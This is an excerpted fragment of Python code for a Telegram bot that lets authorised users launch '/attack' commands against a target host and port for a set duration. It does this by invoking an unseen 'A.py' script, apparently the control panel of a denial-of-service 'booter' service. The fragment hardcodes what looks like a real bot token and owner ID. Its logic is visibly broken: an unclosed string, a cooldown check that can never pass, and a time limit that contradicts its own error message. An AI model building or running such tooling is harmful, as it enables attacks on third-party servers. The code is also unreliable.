...
bot = telebot.TeleBot('8746816423:AAFXc2IY2vgjHJ6S2ehTO9EiMzJ42FYaW-Q)
# Owner and admin user IDs
owner_id = "8667388751"
admin_ids = ["8667388751", "ADMIN_USER_ID2"]
...
@bot.message_handler(func=lambda message: (message.text.startswith('/attack') or not message.text.startswith('/')))
def handle_attack(message):
    ...
    if user_id in allowed_user_ids:
        ...
        wait_time = 180 - (current_time - last_attack_time)
        ...
        if wait_time > 180:
            ...
            if len(command) == 4 or (len(command) == 3 and not message.text.startswith('/')):
                ...
                if time_duration > 30:
                    response = "❌ **Error:** Time interval must be less than 180 minutes."
                else:
                    ...
                    full_command = f"python A.py {target} {port} {time_duration}"
